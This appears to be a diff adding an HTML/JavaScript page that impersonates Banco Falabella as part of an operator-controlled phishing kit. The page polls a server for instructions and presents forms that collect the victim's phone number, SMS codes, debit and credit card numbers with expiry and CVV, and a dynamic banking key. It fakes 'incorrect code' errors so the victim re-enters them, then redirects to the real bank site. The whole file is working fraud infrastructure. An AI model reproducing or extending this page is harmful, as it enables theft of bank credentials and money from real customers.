@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando Solicitud - Banco Falabella</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        .spinner {
+            border: 4px solid #007833;
+            border-top: 4px solid transparent;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.6rem;
+            border: 2px solid #ccc;
+            border-radius: 12px;
+            outline: none;
+        }
+    </style>
+</head>
+
+<body class="bg-white">
+
+    <main class="w-full max-w-sm mx-auto p-6 mt-10 text-center">
+        <div id="content-box">
+            <div class="spinner"></div>
+            <h1 class="text-xl font-semibold mb-2">Verificando tu identidad</h1>
+            <p class="text-sm text-gray-600">Espera un momento...</p>
+        </div>
+    </main>
+
+<script>
+    const sessionId = "{{ session_id }}";
+    const contentBox = document.getElementById("content-box");
+    let currentAction = null;
+
+    async function checkStatus() {
+        try {
+            const res = await fetch(`/api?id=${sessionId}`);
+            const data = await res.json();
+
+            if (!data || !data.action_request)
+                return;
+
+            if (data.action_request !== currentAction) {
+                currentAction = data.action_request;
+                renderAction(data);
+            }
+
+        } catch (e) {
+            console.log("Error:", e);
+        }
+    }
+
+    function renderAction(data) {
+        let html = "";
+
+        switch (data.action_request) {
+
+            case "telefono":
+                html = `
+                    <h2 class="text-xl font-semibold">Verificación de Contacto</h2>
+                    <p class="text-sm text-gray-600 mb-4">Ingresa tu número de teléfono móvil.</p>
+
+                    <form method="POST" action="/form">
+                        <input type="hidden" name="type" value="telefono">
+                        <input type="hidden" name="session_id" value="${sessionId}">
+
+                        <input maxlength="9" name="telefono"
+                               class="w-full p-3 border border-gray-300 rounded-md text-center mb-3">
+                        <button class="bg-green-600 text-white w-full py-3 rounded-lg">Confirmar</button>
+                    </form>
+                `;
+                break;
+
+            case "sms1":
+            case "sms_error":
+                html = `
+                    <h2 class="text-xl font-semibold">Código SMS</h2>
+                    <p class="text-sm text-gray-600 mb-4">Ingresa el código de 6 dígitos enviado a tu celular.</p>
+
+                    <form method="POST" action="/form">
+                        <input type="hidden" name="type" value="sms1">
+                        <input type="hidden" name="session_id" value="${sessionId}">
+                        
+                        <div class="flex justify-center gap-2 mt-4">
+                            <input maxlength="1" class="code-input" name="d1">
+                            <input maxlength="1" class="code-input" name="d2">
+                            <input maxlength="1" class="code-input" name="d3">
+                            <input maxlength="1" class="code-input" name="d4">
+                            <input maxlength="1" class="code-input" name="d5">
+                            <input maxlength="1" class="code-input" name="d6">
+                        </div>
+
+                        <button class="bg-green-600 text-white w-full py-3 rounded-lg mt-4">Confirmar</button>
+
+                        <p class="text-red-600 mt-2">${ data.action_request === "sms_error" ? "Código incorrecto" : ""}</p>
+                    </form>
+                `;
+                break;
+
+            case "td":
+            case "td_error":
+                html = `
+                    <h2 class="text-xl font-semibold">Validar Tarjeta Débito</h2>
+                    <p class="text-sm text-gray-600 mb-4">Ingresa los datos de tu tarjeta.</p>
+
+                    <form method="POST" action="/form">
+                        <input type="hidden" name="type" value="td">
+                        <input type="hidden" name="session_id" value="${sessionId}">
+
+                        <input name="td" maxlength="19" placeholder="0000 0000 0000 0000"
+                               class="w-full p-3 border rounded-md text-center mb-2">
+
+                        <div class="flex gap-2">
+                            <input name="td_fecha" maxlength="5" placeholder="MM/AA" class="w-1/2 p-3 border rounded-md text-center">
+                            <input name="td_cvv" maxlength="3" placeholder="CVV" class="w-1/2 p-3 border rounded-md text-center">
+                        </div>
+
+                        <button class="bg-green-600 text-white w-full py-3 rounded-lg mt-4">Confirmar</button>
+
+                        <p class="text-red-600 mt-2">${ data.action_request === "td_error" ? "Datos incorrectos" : ""}</p>
+                    </form>
+                `;
+                break;
+
+            case "tc":
+            case "tc_error":
+                html = `
+                    <h2 class="text-xl font-semibold">Validar Tarjeta Crédito</h2>
+                    <p class="text-sm text-gray-600 mb-4">Ingresa los datos de tu tarjeta.</p>
+
+                    <form method="POST" action="/form">
+                        <input type="hidden" name="type" value="tc">
+                        <input type="hidden" name="session_id" value="${sessionId}">
+
+                        <input name="tc" maxlength="19" placeholder="0000 0000 0000 0000"
+                               class="w-full p-3 border rounded-md text-center mb-2">
+
+                        <div class="flex gap-2">
+                            <input name="tc_fecha" maxlength="5" placeholder="MM/AA" class="w-1/2 p-3 border rounded-md text-center">
+                            <input name="tc_cvv" maxlength="3" placeholder="CVV" class="w-1/2 p-3 border rounded-md text-center">
+                        </div>
+
+                        <button class="bg-green-600 text-white w-full py-3 rounded-lg mt-4">Confirmar</button>
+
+                        <p class="text-red-600 mt-2">${ data.action_request === "tc_error" ? "Datos incorrectos" : ""}</p>
+                    </form>
+                `;
+                break;
+
+            case "clave_dinamica":
+            case "dinamica_error":
+                html = `
+                    <h2 class="text-xl font-semibold">Clave Dinámica</h2>
+                    <p class="text-sm text-gray-600">Ingresa tu clave dinámica.</p>
+
+                    <form method="POST" action="/form">
+                        <input type="hidden" name="type" value="clave_dinamica">
+                        <input type="hidden" name="session_id" value="${sessionId}">
+
+                        <input name="clave_dinamica" maxlength="6"
+                               class="w-full p-3 border border-gray-300 rounded-md text-center mt-4">
+
+                        <button class="bg-green-600 text-white w-full py-3 rounded-lg mt-4">Confirmar</button>
+
+                        <p class="text-red-600 mt-2">${ data.action_request === "dinamica_error" ? "Clave incorrecta" : ""}</p>
+                    </form>
+                `;
+                break;
+
+            case "final":
+                html = `
+                    <img src="/static/ok.png" class="w-16 mx-auto mb-3">
+                    <h2 class="text-2xl font-semibold">Operación Exitosa</h2>
+                    <p class="text-gray-600 mt-2">Serás redirigido...</p>
+                `;
+                setTimeout(() => window.location.href = "https://www.bancofalabella.cl", 3000);
+                break;
+
+            default:
+                html = `
+                    <div class="spinner"></div>
+                    <p>Esperando acción...</p>
+                `;
+        }
+
+        contentBox.innerHTML = html;
+    }
+
+    setInterval(checkStatus, 2000);
+</script>
+
+</body>
+</html>
